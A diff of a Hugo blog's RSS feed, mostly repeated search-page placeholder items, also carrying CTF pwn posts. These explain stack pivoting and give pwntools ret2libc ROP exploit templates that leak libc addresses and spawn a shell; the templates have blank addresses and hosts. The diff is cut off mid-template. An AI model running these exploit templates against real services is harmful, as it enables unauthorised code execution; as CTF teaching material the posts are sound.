@@ -3,13 +3,178 @@
   <channel>
     <title>Posts on Ssd&#39;s Blog</title>
     <link>https://shaodongshi.github.io/posts/</link>
-    <description>Ssd&#39;s Blog (Posts)</description>
+    <description>Recent content in Posts on Ssd&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 18 Jul 2021 18:45:55 +0800</lastBuildDate>
+    <lastBuildDate>Sun, 18 Jul 2021 18:45:55 +0800</lastBuildDate><atom:link href="https://shaodongshi.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Resultados de Búsqueda</title>
+      <link>https://shaodongshi.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://shaodongshi.github.io/search/</guid>
+      <description>Este archivo existe únicamente para responder a la URL /search con la plantilla de diseño search relacionada.
+No se muestra ningún contenido aquí, todo el contenido se basa en la plantilla layouts/page/search.html
+Establecer una prioridad muy baja en el mapa del sitio le dirá a los motores de búsqueda que éste no es un contenido importante.
+Esta implementación utiliza Fusejs, jquery y mark.js
+Configuración inicial La búsqueda depende del tipo de contenido de salida adicional de JSON en config.</description>
+    </item>
     
-    <atom:link href="https://shaodongshi.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Search Results</title>
+      <link>https://shaodongshi.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://shaodongshi.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
     
+    <item>
+      <title>Search Results</title>
+      <link>https://shaodongshi.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://shaodongshi.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://shaodongshi.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://shaodongshi.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://shaodongshi.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://shaodongshi.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://shaodongshi.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://shaodongshi.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://shaodongshi.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://shaodongshi.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://shaodongshi.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://shaodongshi.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://shaodongshi.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://shaodongshi.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://shaodongshi.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://shaodongshi.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://shaodongshi.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://shaodongshi.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>Search Results</title>
+      <link>https://shaodongshi.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://shaodongshi.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
+    
+    <item>
+      <title>অনুসন্ধানের ফলাফল</title>
+      <link>https://shaodongshi.github.io/search/</link>
+      <pubDate>Tue, 08 Jun 2010 08:06:25 +0600</pubDate>
+      
+      <guid>https://shaodongshi.github.io/search/</guid>
+      <description>This file exists solely to respond to /search URL with the related search layout template.
+No content shown here is rendered, all content is based in the template layouts/page/search.html
+Setting a very low sitemap priority will tell search engines this is not important content.
+This implementation uses Fusejs, jquery and mark.js
+Initial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [&amp;ldquo;HTML&amp;rdquo;, &amp;ldquo;JSON&amp;rdquo;] ```</description>
+    </item>
     
     <item>
       <title>栈迁移原理</title>
@@ -17,46 +182,21 @@
       <pubDate>Sun, 18 Jul 2021 18:45:55 +0800</pubDate>
       
       <guid>https://shaodongshi.github.io/posts/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%8E%9F%E7%90%86/</guid>
-      <description>&lt;h1 id=&#34;栈迁移原理&#34;&gt;栈迁移原理&lt;/h1&gt;
-&lt;h2 id=&#34;0x1利用前提&#34;&gt;0x1利用前提&lt;/h2&gt;
-&lt;p&gt;1.存在栈溢出&lt;/p&gt;
-&lt;p&gt;2.栈溢出可利用空间过小，无法写入较长的ROP链&lt;/p&gt;
-&lt;h2 id=&#34;0x2主要利用点&#34;&gt;0x2主要利用点&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;leave;
-ret;
-#其中leave -&amp;gt;&amp;gt; mov esp,ebp;
-#			  pop ebp;
-#其中ret -&amp;gt;&amp;gt;   pop eip;
-			  
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;0x3利用过程&#34;&gt;0x3利用过程&lt;/h2&gt;
-&lt;p&gt;假设，我们有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这样子，当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images1/image-20210718190622597.png&#34; alt=&#34;image-20210718190622597&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;其中leave_ret为代码leave;ret;地址。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;而实际上在程序调用完成 call 返回的时候，就会有这样的 &lt;code&gt;mov esp,ebp&lt;/code&gt; &lt;code&gt;pop ebp&lt;/code&gt; &lt;code&gt;ret&lt;/code&gt; 指令&lt;/p&gt;
-&lt;p&gt;当我们挨个去执行的时候会出现这样的情况&lt;/p&gt;
-&lt;p&gt;首先是 &lt;code&gt;mov esp,ebp&lt;/code&gt; 执行完以后变成了这个样子：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images1/image-20210718190852099.png&#34; alt=&#34;image-20210718190852099&#34;&gt;&lt;/p&gt;
-&lt;p&gt;然后 &lt;code&gt;pop ebp&lt;/code&gt; 执行完后就是&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;别忘了，pop 指令是把栈顶的值弹到 指定的寄存器，也就是说 esp 会自动的下移一个单位&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images1/image-20210718191020959.png&#34; alt=&#34;image-20210718191020959&#34;&gt;&lt;/p&gt;
-&lt;p&gt;这时候就到 &lt;code&gt;ret&lt;/code&gt; 了，我们可以通过 read 函数来把内容输入到 ebp1_addr 的地址处&lt;/p&gt;
-&lt;p&gt;构造的内容主要是把ebp1 _addr处写成  ebp2_addr 的地址&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;其中&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images1/image-20210718192939078.png&#34; alt=&#34;image-20210718192939078&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;为read的参数&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images1/image-20210718191509039.png&#34; alt=&#34;image-20210718191509039&#34;&gt;&lt;/p&gt;
-&lt;p&gt;read 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样&lt;/p&gt;
-&lt;p&gt;首先是 &lt;code&gt;mov esp,ebp&lt;/code&gt; 执行完成后效果如下：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images1/image-20210718191600943.png&#34; alt=&#34;image-20210718191600943&#34;&gt;&lt;/p&gt;
-&lt;p&gt;然后是 &lt;code&gt;pop ebp&lt;/code&gt; 执行完成后：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images1/image-20210718191924188.png&#34; alt=&#34;image-20210718191924188&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;esp依旧下移一个单位&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;此时再执行 &lt;code&gt;ret&lt;/code&gt; 命令，他就会执行我们构造在 bss 段后者 data 段的那个函数&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://shaodongshi.github.io/images1/image-20210718192318254.png&#34; alt=&#34;image-20210718192318254&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;0x4总结&#34;&gt;0x4总结&lt;/h2&gt;
-&lt;p&gt;栈迁移主要体现在对ebp和esp的控制(通过leave；ret；实现)在bss或data段来开辟一个可执行空间（伪造的栈），&lt;/p&gt;
-&lt;p&gt;并在此执行ROP。&lt;/p&gt;
-</description>
+      <description>栈迁移原理 0x1利用前提 1.存在栈溢出
+2.栈溢出可利用空间过小，无法写入较长的ROP链
+0x2主要利用点 leave; ret; #其中leave -&amp;gt;&amp;gt; mov esp,ebp; #	pop ebp; #其中ret -&amp;gt;&amp;gt; pop eip; 0x3利用过程 假设，我们有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这样子，当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入：
+其中leave_ret为代码leave;ret;地址。
+而实际上在程序调用完成 call 返回的时候，就会有这样的 mov esp,ebp pop ebp ret 指令
+当我们挨个去执行的时候会出现这样的情况
+首先是 mov esp,ebp 执行完以后变成了这个样子：
+然后 pop ebp 执行完后就是
+别忘了，pop 指令是把栈顶的值弹到 指定的寄存器，也就是说 esp 会自动的下移一个单位
+这时候就到 ret 了，我们可以通过 read 函数来把内容输入到 ebp1_addr 的地址处
+构造的内容主要是把ebp1 _addr处写成 ebp2_addr 的地址
+其中
+为read的参数
+read 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样
+首先是 mov esp,ebp 执行完成后效果如下：</description>
     </item>
     
     <item>
@@ -65,56 +205,7 @@ ret;
       <pubDate>Mon, 12 Jul 2021 17:35:19 +0800</pubDate>
       
       <guid>https://shaodongshi.github.io/posts/64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</guid>
-      <description>&lt;h1 id=&#34;64位栈溢出rop模板无pie&#34;&gt;64位栈溢出rop模板（无PIE）&lt;/h1&gt;
-&lt;h2 id=&#34;exp模板&#34;&gt;exp模板&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!usr/bin/env python&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;#coding=utf-8&lt;/span&gt;
-&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
-&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
-
-context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;#p = process(&amp;#34;./&amp;#34;)&lt;/span&gt;
-p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,)
-elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./&amp;#34;&lt;/span&gt;)
-
-read_got &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;read&amp;#39;&lt;/span&gt;]
-puts_plt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]
-main_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
-pop_rdi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
-&lt;span style=&#34;color:#75715e&#34;&gt;#************泄露got*********&lt;/span&gt;
-payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(pop_rdi) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(read_got)
-payload&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(puts_plt) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(main_addr) 
-&lt;span style=&#34;color:#75715e&#34;&gt;#payload = payload.ljust(200,&amp;#39;b&amp;#39;)&lt;/span&gt;
-p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline( payload)
-p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
-read_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)[:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;))
-print hex(read_addr)
-&lt;span style=&#34;color:#75715e&#34;&gt;#*****************************&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;#***********搜索libc，寻址*******&lt;/span&gt;
-libc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LibcSearcher(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;read&amp;#34;&lt;/span&gt;,read_addr)
-offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; read_addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;read&amp;#34;&lt;/span&gt;)
-sys_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; offset &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;system&amp;#34;&lt;/span&gt;)
-bin_sh_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; offset &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;str_bin_sh&amp;#34;&lt;/span&gt;)
-&lt;span style=&#34;color:#75715e&#34;&gt;#***************************&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;#************get shell************&lt;/span&gt;
-payload1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(pop_rdi) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(bin_sh_addr) 
-payload1&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; p64(sys_addr) 
-payload1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; payload1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;)
-
-p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload1)
-
-p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ropgadget&#34;&gt;ROPgadget&lt;/h2&gt;
-&lt;p&gt;ROPgadget &amp;ndash;binary rop  &amp;ndash;only &amp;lsquo;pop|ret&amp;rsquo; | grep &amp;lsquo;eax&amp;rsquo;
-查找可存储寄存器的代码&lt;/p&gt;
-&lt;p&gt;ROPgadget &amp;ndash;binary rop &amp;ndash;string &amp;ldquo;/bin/sh&amp;rdquo;
-查找字符串&lt;/p&gt;
-&lt;p&gt;ROPgadget &amp;ndash;binary rop  &amp;ndash;only &amp;lsquo;int&amp;rsquo;
-查找有int 0x80的地址&lt;/p&gt;
-&lt;h2 id=&#34;64位传参&#34;&gt;64位传参&lt;/h2&gt;
-&lt;p&gt;对于x64体系结构，如果函数参数不大于6个时，使用寄存器传参，对于函数参数大于6个的函数，前六个参数使用寄存器传递，后面的使用栈传递。参数传递的规律是固定的，即前6个参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，后面的依次从 “右向左” 放入栈中。&lt;/p&gt;
-</description>
+      <description>64位栈溢出rop模板（无PIE） exp模板 #!usr/bin/env python #coding=utf-8 from pwn import * from LibcSearcher import * context.log_level = &amp;#39;debug&amp;#39; #p = process(&amp;#34;./&amp;#34;) p = remote(&amp;#34;&amp;#34;,) elf = ELF(&amp;#34;./&amp;#34;) read_got = elf.got[&amp;#39;read&amp;#39;] puts_plt = elf.plt[&amp;#39;puts&amp;#39;] main_addr = pop_rdi = #************泄露got********* payload = b&amp;#39;a&amp;#39;*() + p64(pop_rdi) + p64(read_got) payload+= p64(puts_plt) + p64(main_addr) #payload = payload.ljust(200,&amp;#39;b&amp;#39;) p.sendline( payload) p.recvuntil(&amp;#39;&amp;#39;) read_addr = u64(p.recvuntil(&amp;#39;\x0a&amp;#39;)[:-1].ljust(8, &amp;#39;\x00&amp;#39;)) print hex(read_addr) #***************************** #***********搜索libc，寻址******* libc = LibcSearcher(&amp;#34;read&amp;#34;,read_addr) offset = read_addr - libc.dump(&amp;#34;read&amp;#34;) sys_addr = offset + libc.</description>
     </item>
     
     <item>
@@ -123,57 +214,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
       <pubDate>Sun, 11 Jul 2021 17:26:35 +0800</pubDate>
       
       <guid>https://shaodongshi.github.io/posts/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BArop%E6%A8%A1%E6%9D%BF%E6%97%A0pie/</guid>
-      <description>&lt;h1 id=&#34;32位栈溢出rop模板无pie&#34;&gt;32位栈溢出rop模板（无PIE）&lt;/h1&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!usr/bin/env python&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;#coding=utf-8&lt;/span&gt;
-&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
-&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
-
-context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
-process_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./&amp;#39;&lt;/span&gt;
-&lt;span style=&#34;color:#75715e&#34;&gt;#p = process([process_name], env={&amp;#39;LD_LIBRARY_PATH&amp;#39;:&amp;#39;./&amp;#39;})&lt;/span&gt;
-p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, )
-elf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ELF(process_name)
-&lt;span style=&#34;color:#75715e&#34;&gt;#**************泄露got并寻找libc&lt;/span&gt;
-&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;send_payload&lt;/span&gt;(payload):
-	payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(偏移) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; payload
-	p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, payload)
- 
-main_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
-write_plt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plt[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;write&amp;#39;&lt;/span&gt;]
-write_got &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; elf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;got[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;write&amp;#34;&lt;/span&gt;]
-
-payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; p32(write_plt) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(main_addr) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(write_got) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
-send_payload(payload)
-write_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u32(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvn(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;))
